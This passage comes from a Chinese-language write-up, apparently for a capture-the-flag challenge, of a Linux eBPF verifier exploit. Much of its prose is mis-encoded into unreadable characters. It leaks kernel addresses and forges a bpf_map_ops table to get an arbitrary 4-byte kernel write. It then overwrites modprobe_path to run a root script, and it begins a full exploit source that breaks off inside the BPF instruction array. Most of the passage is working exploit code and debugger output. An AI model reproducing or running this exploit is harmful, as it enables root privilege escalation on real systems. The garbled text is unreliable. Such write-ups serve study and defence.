        inner_map_meta = 0x0 ,
        security = 0xffff88800e93f0f8,
        map_type = 0x2 ,
        key_size = 0x4 ,
        value_size = 0x2000 , 
        max_entries = 0x1 ,
    //...    
        usercnt = {    
    //..
          wait_list = {
            next = 0xffff88800d8780c0,//
      },
      elem_size = 0x2000 ,
      index_mask = 0x0 ,
      aux = 0x0 ,
      {
        value = 0xffff88800d878110,//`, æ”¹æˆæˆ‘ä»¬è‡ªå·±çš„`fake_ops`,
å› ä¸ºå‰é¢æˆ‘ä»¬å·²ç»æ³„éœ²å‡ºmap çš„åœ°å€äº†ï¼Œé‚£ä¹ˆå®Œå…¨å¯ä»¥ç”¨`map_update_elem` ä¼ªé€ ä¸€ä¸ª`ops`,
ç„¶åŽæ”¹ä¸€ä¸‹æŒ‡é’ˆå°±å¯ä»¥åŠ«æŒæŽ§åˆ¶æµäº†ï¼Œzdiä¸Šçš„writeup ç”¨äº†ä¸€ä¸ªæ›´å¥½çš„åŠžæ³•ã€‚
    gefâž¤  p/a *(struct bpf_map_ops *)0xffffffff82016340
    $11 = {
      map_alloc_check = 0xffffffff8116ec70 ,
      map_alloc = 0xffffffff8116fa00 ,
      map_release = 0x0 ,
      map_free = 0xffffffff8116f2d0 ,
      map_get_next_key = 0xffffffff8116ed50 ,
      map_release_uref = 0x0 ,
      map_lookup_elem_sys_only = 0x0 ,
      map_lookup_batch = 0xffffffff81159b30 ,
      map_lookup_and_delete_batch = 0x0 ,
      map_update_batch = 0xffffffff81159930 ,
      map_delete_batch = 0x0 ,
      map_lookup_elem = 0xffffffff8116edd0 ,
      map_update_elem = 0xffffffff8116f1c0 ,
      map_delete_elem = 0xffffffff8116ed80 ,
      map_push_elem = 0x0 ,
      map_pop_elem = 0x0 ,
      map_peek_elem = 0x0 ,
      map_fd_get_ptr = 0x0 ,
      map_fd_put_ptr = 0x0 ,
      map_gen_lookup = 0xffffffff8116f050 ,
      map_fd_sys_lookup_elem = 0x0 ,
      map_seq_show_elem = 0xffffffff8116ee80 ,
      map_check_btf = 0xffffffff8116f870 ,
      map_poke_track = 0x0 ,
      map_poke_untrack = 0x0 ,
      map_poke_run = 0x0 ,
      map_direct_value_addr = 0xffffffff8116ece0 ,
      map_direct_value_meta = 0xffffffff8116ed10 ,
      map_mmap = 0xffffffff8116ee50 
    }
`map_push_elem` ä¼šåœ¨ `map_update_elem` çš„æ—¶å€™è¢«è°ƒç”¨, å®ƒéœ€è¦map
çš„ç±»åž‹æ˜¯`BPF_MAP_TYPE_QUEUE`æˆ–è€…`BPF_MAP_TYPE_STACK`, ä½†æ˜¯æ²¡æœ‰å…³ç³»ï¼Œ map ä¸Šçš„ä»»ä½•å†…å®¹éƒ½å¯ä»¥ç”¨ `r7`
æ¥æ”¹ï¼ŒæŠŠ`map_type` æ”¹æˆ`BPF_MAP_TYPE_STACK` (0x17)ä¹‹åŽï¼Œæ¯æ¬¡è°ƒç”¨`map_update_elem`æ—¶,
å°±ä¼šè°ƒç”¨`map_push_elem`
     static int bpf_map_update_value(struct bpf_map *map, struct fd f, void *key,  
                    void *value, __u64 flags)                                     
    {                                                                             
    //...                    
        } else if (map->map_type == BPF_MAP_TYPE_QUEUE ||     
            Â¦  map->map_type == BPF_MAP_TYPE_STACK) {         
            err = map->ops->map_push_elem(map, value, flags); 
    //..
åœ¨ `fake_ops` ä¸Š, æˆ‘ä»¬æŠŠ`map_push_elem` æ”¹æˆ`map_get_next_key` ä¸€æ ·çš„åœ°å€ï¼Œ
è¿™é‡Œå®žé™…çš„`map_get_next_key`æ˜¯å‡½æ•°`array_map_get_next_key`
    uint64_t fake_map_ops[]={
        kaslr +0xffffffff8116ec70,                 
        kaslr +0xffffffff8116fa00,                 
        0x0,                                       
        kaslr +0xffffffff8116f2d0,                 
        kaslr +0xffffffff8116ed50,// 5: map_get_next_key  
        0x0,                                       
        //...                
        kaslr +0xffffffff8116ed80,                 
        kaslr +0xffffffff8116ed50,//15: map_push_elem 
        0x0,                                       
        0x0,                                       
        //...                
    }
`array_map_get_next_key` å®žçŽ°åœ¨`kernel/bpf/arraymap.c#L279` ä¸Šï¼Œ ä¼ é€’ç»™`map_push_elem`
çš„å‚æ•°æ˜¯`value`(ring3 è¦updateçš„æ•°æ®)å’Œ `uattr` çš„ flags, åˆ†åˆ«å¯¹åº”`array_map_get_next_key` çš„
`key` å’Œ `next_key` å‚æ•°
    static int array_map_get_next_key(struct bpf_map *map, void *key, void *next_key)   
    {                                                                                   
        struct bpf_array *array = container_of(map, struct bpf_array, map);             
        u32 index = key ? *(u32 *)key : U32_MAX;                                        
        u32 *next = (u32 *)next_key;                                                    
        if (index >= array->map.max_entries) {    //index                                      
            *next = 0;                                                                  
            return 0;                                                                   
        }                                                                               
        if (index == array->map.max_entries - 1)                                        
            return -ENOENT;                                                             
        *next = index + 1;                                                              
        return 0;                                                                       
    }
åŠ å…¥æˆ‘ä»¬è¿è¡Œ `map_update_elem(mapfd, &key, &value, flags)`, è¿è¡Œåˆ°
`array_map_get_next_key` ä¹‹åŽæœ‰
`index == value[0]`, `next = flags` ï¼Œ æœ€ç»ˆæ•ˆæžœæ˜¯ `*flags = value[0]`
value[0] å’Œ flags éƒ½æ˜¯ ring3 ä¸‹ä¼ å…¥çš„å€¼ï¼Œå‰é¢æˆ‘ä»¬å·²ç»æ³„éœ²äº†å†…æ ¸åœ°å€ï¼ŒäºŽæ˜¯å°±å¯ä»¥é€šè¿‡ä¿®æ”¹ `flags`
çš„å€¼å†™ä»»æ„å†…å­˜å•¦ã€‚å†™å…¥çš„indexè¦æ»¡è¶³`(index >= array->map.max_entries)`, `map_entries` å¯ä»¥ç”¨`r7`
æ”¹æˆ`0xffff ffff`
è¿™é‡Œindex å’Œ next éƒ½æ˜¯ u32 ç±»åž‹ï¼Œ æ‰€ä»¥å°±æ˜¯ä»»æ„åœ°å€å†™ 4ä¸ªbyte.
å…·ä½“çš„æ“ä½œæ˜¯
  * 1 å†™ r7 æ”¹å†™ ops åˆ° fake_ops ( map_push_elem æ”¹æˆ`array_map_get_next_key` åœ°å€)
  * 2 ä¿®æ”¹ map çš„ä¸€äº›å­—æ®µç»•è¿‡ä¸€äº›æ£€æŸ¥ 
    * spin_lock_off = 0
    * max_entries = `0xffff ffff`
    * map_type = `BPF_MAP_TYPE_STACK`
  * 3 è°ƒç”¨ `map_update_elem` å†™å†…å­˜
###  æ”¹modprobe_path ç”¨rootä»»æ„å‘½ä»¤
å¯ä»¥ä»»æ„åœ°å€å†™è¿™ä¸ªèƒ½åŠ›è¿˜æ˜¯æŒºå¤§çš„äº†ï¼Œzdi çš„writeup ä¸Šæ˜¯é€šè¿‡æœç´¢ `init_pid_ns`ï¼Œ æ‰¾åˆ°å½“å‰çš„`task_struct`, ç„¶åŽå†™
cred æ¥èŽ·å–ä¸€ä¸ª root shellã€‚
æ—¢ç„¶å·²ç»å¯ä»¥ä»»æ„åœ°å€å†™äº†ï¼Œè¿™é‡Œæˆ‘çš„åšæ³•æ˜¯æ”¹å†™`modprobe_path` , ç„¶åŽå°±å¯ä»¥ç”¨root æƒé™æ‰§è¡Œä»»æ„æŒ‡ä»¤äº†ï¼Œè™½ç„¶ä¸èƒ½èµ·root shellï¼Œ
ä½†æ˜¯ä¹Ÿæ˜¯å¯ä»¥è¾¾åˆ°ææƒç›®çš„äº†(ä¸»è¦æ˜¯æ‡’ ðŸ˜› )
`/tmp` ç›®å½•ä¸‹ç”Ÿæˆ `/tmp/chmod` å’Œ `/tmp/fake` , `/tmp/chmod` å¯ä»¥æ”¹ `/flag` æ–‡ä»¶çš„æƒé™
    void gen_fake_elf(){                                                       
        system("echo -ne '#!/bin/shn/bin/chmod 777 /flagn' > /tmp/chmod");   
        system("chmod +x /tmp/chmod");                                         
        system("echo -ne '\xff\xff\xff\xff' > /tmp/fake");                 
        system("chmod +x /tmp/fake");                                          
    }
ç„¶åŽæŠŠ`modprobe_path` æ”¹æˆ `/tmp/chmod`, ç„¶åŽè¿è¡Œ `/tmp/fake` å°±å®Œäº‹å•¦
     expbuf64[0] = 0x706d742f -1;                              
     bpf_update_elem(expmapfd,&key,expbuf,modprobe_path);      
     expbuf64[0] = 0x6d68632f -1;                              
     bpf_update_elem(expmapfd,&key,expbuf,modprobe_path+4);    
     expbuf64[0] = 0x646f -1;                                  
     bpf_update_elem(expmapfd,&key,expbuf,modprobe_path+8);
## exp
å®Œæ•´exp å¦‚ä¸‹ï¼Œè¿™é‡Œéœ€è¦æœ‰ä¸¤ä¸ªå¤´æ–‡ä»¶ï¼Œ`bpf_insn.h` åœ¨`samples/bpf/bpf_insn.h` ä¸‹ï¼Œ ä¸»è¦æ˜¯ç”ŸæˆæŒ‡ä»¤çš„ä¸€äº›å®å®šä¹‰ã€‚
å› ä¸ºæˆ‘æœ¬æœºçš„ubuntu å†…æ ¸è¿˜ä¸æ”¯æŒ`BPF_JMP32` æ‰€ä»¥è¿˜éœ€è¦æ‹·è´ä¸€ä¸ª`bpf.h` ï¼Œå®ƒåœ¨`include/uapi/linux/bpf.h`
æ•´ç†ä¸€ä¸‹ `bpf_insns` éƒ½åšäº†ä»€ä¹ˆï¼Œ è¿™é‡Œæˆ‘åˆ›å»ºäº†ä¸¤ä¸ªmap( `ctrlmap` å’Œ `expmap`, æœ‰ç‚¹ä¹±â€¦)
ç¬¬ä¸€æ¬¡ `writemsg()` ï¼ˆ `ctrlmap[0] = 2; ctrlmap[1] = 0`ï¼‰
  * `r9 æŒ‡å‘ ctrlmap[0]` , load ä¹‹åŽ `r6 ==2`
  * ç„¶åŽå‰é¢æè¿°çš„æ¼æ´žè§¦å‘è¿‡ç¨‹ï¼Œ æœ€åŽ `BPF_ALU64_IMM(BPF_MUL,6,0x110)`, å¾—åˆ° `r6 == 0x100`
  * `r7 æŒ‡å‘ expmap[0]`, ç„¶åŽ sub r6, èŽ·å– `bpf_map_ops`å’Œ map çš„åœ°å€ï¼Œå†™å…¥åˆ° `ctrlmap[0][0x10]ctrlmap[0][0x18]` çš„ä½ç½®
  * exp ä¸­ `map_lookup_elem` èŽ·å– æ³„éœ²çš„åœ°å€
ç¬¬äºŒæ¬¡ `writemsg()` ï¼ˆ `ctrlmap[0] = 2; ctrlmap[1] = 1`)
  * æŠŠ `fake_map_ops` ä¿å­˜åˆ° `expmap[0]` ä¸Š, ä¿®æ”¹åŽŸæ¥çš„ `ops` æŒ‡å‘`fake_map_ops`
  * æ”¹ `spin_lock_off`, `max_entries` ,`map_type`
  * `map_update_elem` æ”¹ `modprobe_path`
    #define _GNU_SOURCE
    #include        
    #include       
    #include       
    #include        
    #include       
    #include       
    #include    
    #include  
    #include   
    #include        
    #include "linux/bpf.h"   
    #include "bpf_insn.h"    
    int ctrlmapfd, expmapfd;
    int progfd;
    int sockets[2];
    #define LOG_BUF_SIZE 65535
    char bpf_log_buf[LOG_BUF_SIZE];
    void gen_fake_elf(){
        system("echo -ne '#!/bin/shn/bin/chmod 777 /flagn' > /tmp/chmod"); 
        system("chmod +x /tmp/chmod");
        system("echo -ne '\xff\xff\xff\xff' > /tmp/fake");
        system("chmod +x /tmp/fake");
    }
    void init(){
        setbuf(stdin,0);
        setbuf(stdout,0);
        gen_fake_elf();
    }
    void x64dump(char *buf,uint32_t num){         
        uint64_t *buf64 =  (uint64_t *)buf;       
        printf("[-x64dump-] start : n");         
        for(int i=0;i<num;i++){                   
                if(i%2==0 && i!=0){                   
                    printf("n");                     
                }                                     
                printf("0x%016lx ",*(buf64+i));       
            }                                         
        printf("n[-x64dump-] end ... n");       
    }                                             
    void loglx(char *tag,uint64_t num){         
        printf("[lx] ");                        
        printf(" %-20s ",tag);                  
        printf(": %-#16lxn",num);              
    }                                           
    static int bpf_prog_load(enum bpf_prog_type prog_type,         
            const struct bpf_insn *insns, int prog_len,  
            const char *license, int kern_version);      
    static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,  
            int max_entries);                                                 
    static int bpf_update_elem(int fd ,void *key, void *value,uint64_t flags);
    static int bpf_lookup_elem(int fd,void *key, void *value);
    static void writemsg(void);
    static void __exit(char *err);
    struct bpf_insn insns[]={
        BPF_LD_MAP_FD(BPF_REG_1,3),
        BPF_ALU64_IMM(BPF_MOV,6,0),
        BPF_STX_MEM(BPF_DW,10,6,-8),
        BPF_MOV64_REG(7,10),
        BPF_ALU64_IMM(BPF_ADD,7,-8),
        BPF_MOV64_REG(2,7),
        BPF_RAW_INSN(BPF_JMP|BPF_CALL,0,0,0,
                BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JNE,0,0,1),
        BPF_EXIT_INSN(),
        // r9 = ctrlmap[0]
        BPF_MOV64_REG(9,0),
        //2
        BPF_LDX_MEM(BPF_DW,6,9,0),
        // offset
        /*// BPF_JGE çœ‹ tnum  umin 1*/
        BPF_ALU64_IMM(BPF_MOV,0,0),
        BPF_JMP_IMM(BPF_JGE,6,1,1),
        BPF_EXIT_INSN(),
        BPF_MOV64_IMM(8,0x1),
        BPF_ALU64_IMM(BPF_LSH,8,32),
        BPF_ALU64_IMM(BPF_ADD,8,1),
         /*BPF_JLE çœ‹ tnum  umax 0x100000001*/
        BPF_JMP_REG(BPF_JLE,6,8,1),
        BPF_EXIT_INSN(),